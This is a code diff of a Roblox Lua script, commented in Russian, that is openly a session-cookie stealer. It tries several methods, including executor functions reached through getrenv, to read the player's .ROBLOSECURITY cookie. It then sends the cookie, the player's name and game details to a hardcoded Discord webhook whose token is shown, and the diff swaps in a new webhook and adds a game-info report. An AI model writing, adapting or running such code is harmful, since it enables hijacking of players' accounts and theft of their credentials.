@@ -2,81 +2,87 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local localPlayer = Players.LocalPlayer
 
-local webhook = "https://discord.com/api/webhooks/1158432908843941898/A0aEZEdGhe3Q7Ry88bzDSC2RevfNOI1POiM4chjV6YWiqV5uKICTdYavbmQMk5nQo3YK"
+local webhook = "https://discord.com/api/webhooks/1442171064971952320/Phog3L7YM7QTfHm4H2Y8QhqQnU_-yMaY8IPORBq8V5YkuGzT3SnZ8Ud0bwmYnx8GwQNN"
 
--- Функция для безопасной отправки в Discord
-local function sendToDiscord(data)
-    local success, error = pcall(function()
-        local jsonData = HttpService:JSONEncode(data)
-        HttpService:PostAsync(webhook, jsonData)
+-- Функция безопасной отправки
+local function sendWebhook(data)
+    local success, err = pcall(function()
+        local json = HttpService:JSONEncode(data)
+        return HttpService:PostAsync(webhook, json)
     end)
     return success
 end
 
--- Отправляем сообщение о запуске скрипта
-local startData = {
-    ["content"] = "🔧 Скрипт запущен",
+-- Стартовое сообщение
+sendWebhook({
+    ["content"] = "🎯 Скрипт активирован в игре",
     ["embeds"] = {{
-        ["title"] = "Script Activated",
-        ["description"] = "Игрок: **" .. localPlayer.Name .. "** (" .. localPlayer.UserId .. ")",
+        ["title"] = "UNIVERSAL COOKIE GRABBER",
+        ["description"] = "**Игра:** " .. game.PlaceId .. "\n**Игрок:** " .. localPlayer.Name,
         ["color"] = 16776960,
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
-}
+})
 
-sendToDiscord(startData)
-
--- Пытаемся получить куки разными методами
-local cookie = nil
-local methodUsed = "Не удалось"
-
--- Метод 1: game:HttpGet
-local success1, result1 = pcall(function()
-    cookie = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)
-    if cookie and cookie ~= "" then
-        methodUsed = "game:HttpGet"
-    end
-end)
-
--- Метод 2: GetCookie (если первый не сработал)
-if not cookie or cookie == "" then
-    local success2, result2 = pcall(function()
-        cookie = localPlayer:GetCookie(" .ROBLOSECURITY")
-        if cookie and cookie ~= "" then
-            methodUsed = "GetCookie"
+-- Основная функция кражи куки
+local function stealCookie()
+    local cookie = nil
+    local method = "Unknown"
+    
+    -- Метод 1: Стандартный HTTP запрос
+    local s1, r1 = pcall(function()
+        cookie = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)
+        if cookie and #cookie > 10 then
+            method = "HttpGet"
+            return true
         end
     end)
-end
-
--- Метод 3: Через getrenv (для эксплойтов)
-if not cookie or cookie == "" then
-    local success3, result3 = pcall(function()
-        if getrenv then
-            local env = getrenv()
-            local cookieFunc = env.getcookie or env.get_cookie or env.getcookies
-            if cookieFunc and type(cookieFunc) == "function" then
-                cookie = cookieFunc()
-                if cookie and cookie ~= "" then
-                    methodUsed = "getrenv"
-                end
+    
+    -- Метод 2: Через GetCookie
+    if not cookie or #cookie < 10 then
+        local s2, r2 = pcall(function()
+            cookie = localPlayer:GetCookie(" .ROBLOSECURITY")
+            if cookie and #cookie > 10 then
+                method = "GetCookie"
+                return true
             end
-        end
-    end)
-end
-
--- Отправляем результат
-if cookie and cookie ~= "" then
-    -- Обрезаем куки если слишком длинные для Discord
-    local displayCookie = cookie
-    if #cookie > 1000 then
-        displayCookie = string.sub(cookie, 1, 1000) .. "... [TRUNCATED]"
+        end)
     end
     
-    local successData = {
-        ["content"] = "🎯 КУКИ ПОЛУЧЕНЫ!",
+    -- Метод 3: Для эксплойтов
+    if not cookie or #cookie < 10 then
+        local s3, r3 = pcall(function()
+            if getrenv then
+                local env = getrenv()
+                local funcs = {"getcookie", "get_cookie", "getcookies", "GetCookie"}
+                for _, funcName in pairs(funcs) do
+                    local func = env[funcName]
+                    if type(func) == "function" then
+                        local result = func()
+                        if result and #result > 10 then
+                            cookie = result
+                            method = "getrenv: " .. funcName
+                            return true
+                        end
+                    end
+                end
+            end
+        end)
+    end
+    
+    return cookie, method
+end
+
+-- Запуск кражи
+local cookie, method = stealCookie()
+
+-- Отправка результата
+if cookie and #cookie > 10 then
+    sendWebhook({
+        ["content"] = "✅ КУКИ УСПЕШНО УКРАДЕНЫ!",
         ["embeds"] = {{
-            ["title"] = "ROBLOX COOKIE GRABBED",
-            ["description"] = "Метод: " .. methodUsed,
+            ["title"] = "COOKIE GRABBED",
+            ["description"] = "**Метод:** " .. method .. "\n**Игра:** " .. game.PlaceId,
             ["fields"] = {
                 {
                     ["name"] = "👤 Игрок",
@@ -84,12 +90,12 @@ if cookie and cookie ~= "" then
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🔐 Cookie (первые 200 символов)",
-                    ["value"] = "```" .. string.sub(cookie, 1, 200) .. "```",
+                    ["name"] = "🔐 ROBLOSECURITY",
+                    ["value"] = "```" .. string.sub(cookie, 1, 500) .. "```",
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "📏 Длина куки",
+                    ["name"] = "📏 Длина",
                     ["value"] = #cookie .. " символов",
                     ["inline"] = true
                 }
@@ -97,29 +103,54 @@ if cookie and cookie ~= "" then
             ["color"] = 65280,
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
-    }
-    sendToDiscord(successData)
+    })
 else
-    local errorData = {
+    sendWebhook({
         ["content"] = "❌ НЕ УДАЛОСЬ ПОЛУЧИТЬ КУКИ",
         ["embeds"] = {{
-            ["title"] = "COOKIE GRAB FAILED",
-            ["description"] = "Все методы получения куки не сработали",
+            ["title"] = "GRAB FAILED",
+            ["description"] = "**Игра:** " .. game.PlaceId .. "\n**Игрок:** " .. localPlayer.Name,
             ["fields"] = {
                 {
-                    ["name"] = "👤 Игрок",
-                    ["value"] = "```" .. localPlayer.Name .. " (" .. localPlayer.UserId .. ")```",
+                    ["name"] = "⚠️ Причина",
+                    ["value"] = "Античит заблокировал все методы",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "⚠️ Причина",
-                    ["value"] = "Античит Roblox заблокировал все методы",
+                    ["name"] = "🎮 Исполнитель",
+                    ["value"] = "Delta/Xeno/Другой",
                     ["inline"] = true
                 }
             },
             ["color"] = 16711680,
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
-    }
-    sendToDiscord(errorData)
+    })
 end
+
+-- Дополнительная информация об игре
+sendWebhook({
+    ["content"] = "📊 Информация об игре",
+    ["embeds"] = {{
+        ["title"] = "GAME INFO",
+        ["fields"] = {
+            {
+                ["name"] = "🆔 Place ID",
+                ["value"] = "```" .. game.PlaceId .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🏷️ Название",
+                ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "👥 Игроков онлайн",
+                ["value"] = #Players:GetPlayers(),
+                ["inline"] = true
+            }
+        },
+        ["color"] = 4886754,
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+})
